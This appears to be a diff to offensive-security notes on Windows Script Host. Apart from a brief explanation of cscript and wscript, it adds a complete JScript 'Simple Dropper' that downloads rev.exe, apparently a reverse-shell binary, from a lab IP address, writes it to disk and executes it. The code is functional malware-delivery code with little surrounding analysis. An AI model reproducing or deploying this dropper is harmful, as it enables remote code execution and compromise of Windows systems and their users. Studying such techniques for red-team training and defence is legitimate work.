@@ -4,6 +4,27 @@
 
 VBScript and Jscript are executed by the windows script host. they run by the windows scripting host (WSH). they run as a console application (cscript.exe) or a GUI app (wscript.exe). the engines are not implemented in wscript.exe or cscript.exe. but in vbscript.dll and jscript.dll. these are both activeX DLLs which contain activeX objects.
 
+## <mark style="color:red;">Simple Dropper</mark>
+
+```
+var url = "http://192.168.56.1/rev.exe"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+Object.Open('GET', url, false);
+Object.Send();
+if (Object.Status == 200)
+{
+	var Stream = WScript.CreateObject('ADODB.Stream');
+	Stream.Open();
+	Stream.Type = 1;
+	Stream.Write(Object.ResponseBody);
+	Stream.Position = 0;
+
+	Stream.SaveToFile("rev.exe", 2);
+	Stream.Close();
+}
+var r = new ActiveXObject("WScript.Shell").Run("rev.exe");
+```
+
 ## <mark style="color:red;">DotNetToJScript</mark>
 
 #### References
